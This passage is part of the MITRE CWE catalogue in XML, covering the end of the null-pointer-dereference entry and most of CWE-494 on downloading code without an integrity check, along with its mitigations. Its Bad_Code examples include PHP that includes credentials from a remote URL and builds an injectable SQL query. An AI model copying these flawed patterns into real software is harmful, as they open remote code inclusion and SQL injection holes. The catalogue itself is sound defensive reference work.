						service (crash from null dereference) or execute arbitrary code via a
						crafted request during authentication protocol
						selection.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0458</Observed_Example_Reference>
               <Observed_Example_Description>Game allows remote attackers to cause a denial of
						service (server crash) via a missing argument, which triggers a null pointer
						dereference.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0401</Observed_Example_Reference>
               <Observed_Example_Description>Network monitor allows remote attackers to cause a
						denial of service (crash) or execute arbitrary code via malformed packets
						that cause a NULL pointer dereference.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>Null Dereference</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Null-pointer dereference</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Null Dereference (Null Pointer Dereference)</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Denial of Service</Mapped_Node_Name>
               <Mapped_Node_ID>A9</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Ensure a null pointer is not dereferenced</Mapped_Node_Name>
               <Mapped_Node_ID>EXP34-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Detect and handle memory allocation errors</Mapped_Node_Name>
               <Mapped_Node_ID>MEM32-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure a null pointer is not dereferenced</Mapped_Node_Name>
               <Mapped_Node_ID>EXP34-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Detect and handle memory allocation errors</Mapped_Node_Name>
               <Mapped_Node_ID>MEM32-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Faulty Pointer Use</Mapped_Node_Name>
               <Mapped_Node_ID>SFP7</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <White_Box_Definitions>
            <White_Box_Definition>
               <Text>A weakness where the code path has:</Text>
               <Block>
                  <Text>1. start statement that assigns a null value to the pointer</Text>
                  <Text>2. end statement that dereferences a pointer</Text>
                  <Text>3. the code path does not contain any other statement that assigns
							value to the pointer</Text>
               </Block>
            </White_Box_Definition>
         </White_Box_Definitions>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>7 Pernicious Kingdoms</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>KDM Analytics</Modifier_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Relationships, Other_Notes, Taxonomy_Mappings,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Other_Notes, Potential_Mitigations,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description,
						Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="494" Name="Download of Code Without Integrity Check" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The product downloads source code or an executable from a
					remote location and executes the code without sufficiently verifying the origin
					and integrity of the code.</Description_Summary>
            <Extended_Description>
               <Text>An attacker can execute malicious code by compromising the host server,
						performing DNS spoofing, or modifying the code in transit.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>865</Relationship_Target_ID>
               <!--2011 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>490</Relationship_Target_ID>
               <!--Mobile Code Issues--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>669</Relationship_Target_ID>
               <!--Incorrect Resource Transfer Between Spheres--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>PeerOf</Relationship_Nature>
               <Relationship_Target_ID>79</Relationship_Target_ID>
               <!--Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>752</Relationship_Target_ID>
               <!--2009 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>859</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 14 - Platform Security (SEC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>991</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Tainted Input to Environment--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Alter execution
						logic</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Other</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Executing untrusted code could compromise the control flow of the
							program. The untrusted code could execute attacker-controlled commands,
							read or modify sensitive resources, or prevent the software from
							functioning correctly for legitimate users.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7.4">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
                  <Text>Specifically, manual static analysis is typically required to find the
							behavior that triggers the download of code, and to determine whether
							integrity-checking methods are in use.</Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-11">
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Use monitoring tools that examine the software's process as it
							interacts with the operating system and the network. This technique is
							useful in cases when source code is unavailable, if the software was not
							developed by you, or if you want to verify that the build phase did not
							introduce any new weaknesses. Examples include debuggers that directly
							attach to the running process; system-call tracing utilities such as
							truss (Solaris) and strace (Linux); system activity monitors such as
							FileMon, RegMon, Process Monitor, and other Sysinternals utilities
							(Windows); and sniffers and protocol analyzers that monitor network
							traffic.</Text>
                  <Text>Attach the monitor to the process and also sniff the network
							connection. Trigger features related to product updates or plugin
							installation, which is likely to force a code download. Monitor when
							files are downloaded and separately executed, or if they are otherwise
							read back into the process. Look for evidence of cryptographic library
							calls that use integrity checking.</Text>
               </Method_Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-42">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Perform proper forward and reverse DNS lookups to detect DNS spoofing.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is only a partial solution since it will not prevent your code
							from being modified on the hosting site or in transit.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Encrypt the code with a reliable encryption scheme before
							transmitting.</Text>
                  <Text>This will only be a partial solution, since it will not detect DNS
							spoofing and it will not prevent your code from being modified on the
							hosting site.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>Speficially, it may be helpful to use tools or frameworks to perform
							integrity checking on the transmitted code.</Text>
                  <Block Block_Nature="List">
                     <Text>When providing the code that is to be downloaded, such as for
								automatic updates of the software, then use cryptographic signatures
								for the code and modify the download clients to verify the
								signatures. Ensure that the implementation does not contain CWE-295,
								CWE-320, CWE-347, and related weaknesses.</Text>
                     <Text>Use code signing technologies such as Authenticode. See references
								[R.494.1] [R.494.2] [R.494.3].</Text>
                  </Block>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.494.7]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example loads an external class from a local
						subdirectory.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>URL[] classURLs= new URL[]{</Code>
                     <Block>
                        <Code>new URL("file:subdir/")</Code>
                     </Block>
                     <Code>};</Code>
                     <Code>URLClassLoader loader = new URLClassLoader(classURLs);</Code>
                     <Code>Class loadedClass = Class.forName("loadMe", true, loader);</Code>
                  </Block>
                  <Text>This code does not ensure that the class loaded is the intended one,
							for example by verifying the class's checksum. An attacker may be able
							to modify the class file to execute malicious code.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code includes an external script to get database credentials,
						then authenticates a user against the database, allowing access to the
						application.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Comment> //assume the password is already encrypted, avoiding
								CWE-312</Comment>
                     <Code>function authenticate($username,$password){</Code>
                     <Block>
                        <Code> include("http://external.example.com/dbInfo.php");</Code>
                        <Comment> //dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname
									available</Comment>
                        <Code> mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error
									connecting to mysql');</Code>
                        <Code> mysql_select_db($dbname);</Code>
                        <Code> $query = 'Select * from users where username='.$username.'
									And password='.$password;</Code>
                        <Code> $result = mysql_query($query);</Code>
                        <Code>if(mysql_numrows($result) == 1){</Code>
                        <Block>
                           <Code> mysql_close();</Code>
                           <Code>return true;</Code>
                        </Block>
                        <Code> }</Code>
                        <Code> else{</Code>
                        <Block>
                           <Code> mysql_close();</Code>
                           <Code> return false;</Code>
                        </Block>
                        <Code> }</Code>
                        <Code> }</Code>
                     </Block>
                  </Block>
                  <Text>This code does not verify that the external domain accessed is the
							intended one. An attacker may somehow cause the external domain name to
							resolve to an attack server, which would provide the information for a
							false database. The attacker may then steal the usernames and encrypted
							passwords from real user login attempts, or simply allow himself to
							access the application without a real user account.</Text>
                  <Text>This example is also vulnerable to a Man in the Middle (CWE-300)
							attack.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3438</Observed_Example_Reference>
               <Observed_Example_Description>OS does not verify authenticity of its own
						updates.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3324</Observed_Example_Reference>
               <Observed_Example_Description>online poker client does not verify authenticity
						of its own updates.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-1125</Observed_Example_Reference>
               <Observed_Example_Description>anti-virus product does not verify automatic
						updates for itself.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0671</Observed_Example_Reference>
               <Observed_Example_Description>VOIP phone downloads applications from web sites
						without verifying integrity.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Research_Gaps>
            <Research_Gap>
               <Text>This is critical for mobile code, but it is likely to become more and more
						common as developers continue to adopt automated, network-based product
						distributions and upgrades. Software-as-a-Service (SaaS) might introduce
						additional subtleties. Common exploitation scenarios may include ad server
						compromises and bad upgrades.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference Local_Reference_ID="R.494.1">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Introduction to Code Signing</Reference_Title>
               <Reference_Link>http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.494.2">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Authenticode</Reference_Title>
               <Reference_Link>http://msdn.microsoft.com/en-us/library/ms537359(v=VS.85).aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.494.3">
               <Reference_Author>Apple</Reference_Author>
               <Reference_Title>Code Signing Guide</Reference_Title>
               <Reference_Publication>Apple Developer Connection</Reference_Publication>
               <Reference_Date>2008-11-19</Reference_Date>
               <Reference_Link>http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.494.4">
               <Reference_Author>Anthony Bellissimo</Reference_Author>
               <Reference_Author>John Burgess</Reference_Author>
               <Reference_Author>Kevin Fu</Reference_Author>
               <Reference_Title>Secure Software Updates: Disappointments and New
						Challenges</Reference_Title>
               <Reference_Link>http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.494.5">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 18: The Sins of Mobile Code." Page
						267</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.494.6">
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 20 - Download of Code Without Integrity
						Check</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-04-05</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/04/05/top-25-series-rank-20-download-code-integrity-check/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.494.7">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Invoking untrusted mobile code</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Do not rely on the default automatic signature verification
						provided by URLClassLoader and java.util.jar</Mapped_Node_Name>
               <Mapped_Node_ID>SEC06-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Tainted input to environment</Mapped_Node_Name>
               <Mapped_Node_ID>SFP27</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>184</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>185</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>186</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>187</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>CLASP</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Description, Name, Other_Notes, Potential_Mitigations, References,
						Relationships, Research_Gaps, Type</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Observed_Examples,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors,
						Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
